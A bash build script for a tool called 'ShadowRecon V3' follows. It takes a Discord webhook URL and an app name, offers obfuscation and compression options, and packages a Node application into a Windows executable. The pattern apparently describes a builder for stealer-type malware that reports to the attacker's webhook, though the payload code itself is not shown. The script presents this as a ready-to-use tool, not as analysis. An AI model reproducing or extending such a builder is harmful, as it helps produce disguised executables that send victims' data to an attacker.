#!/bin/bash

# ShadowRecon V3 - Build Script
# Usage: ./build.sh <webhook_url> <app_name> [options]

echo "🔥 ShadowRecon V3 - Modular Build System"
echo "========================================="

# Check arguments
if [ $# -lt 2 ]; then
    echo "Usage: $0 <webhook_url> <app_name> [options]"
    echo ""
    echo "Options:"
    echo "  --obfuscate    Obfuscate code"
    echo "  --compress     Compress executable"
    echo "  --target       Target platform (default: node16-win-x64)"
    echo ""
    echo "Examples:"
    echo "  $0 https://discord.com/api/webhooks/... MyApp"
    echo "  $0 https://discord.com/api/webhooks/... MyApp --obfuscate --compress"
    exit 1
fi

WEBHOOK_URL="$1"
APP_NAME="$2"
shift 2

# Check if Node.js is installed
if ! command -v node &> /dev/null; then
    echo "❌ Node.js is not installed. Please install Node.js 14.0.0 or higher."
    exit 1
fi

# Check if pkg is installed
if ! command -v pkg &> /dev/null; then
    echo "📦 Installing pkg globally..."
    npm install -g pkg
fi

# Install dependencies if node_modules doesn't exist
if [ ! -d "node_modules" ]; then
    echo "📦 Installing dependencies..."
    npm install
fi

# Run the build
echo "🔨 Building application..."
echo "Webhook: $WEBHOOK_URL"
echo "App Name: $APP_NAME"
echo "Options: $@"
echo ""

node build/builder.js "$WEBHOOK_URL" "$APP_NAME" "$@"

if [ $? -eq 0 ]; then
    echo ""
    echo "✅ Build completed successfully!"
    echo "📁 Check the 'dist' folder for your built application."
else
    echo ""
    echo "❌ Build failed!"
    exit 1
fi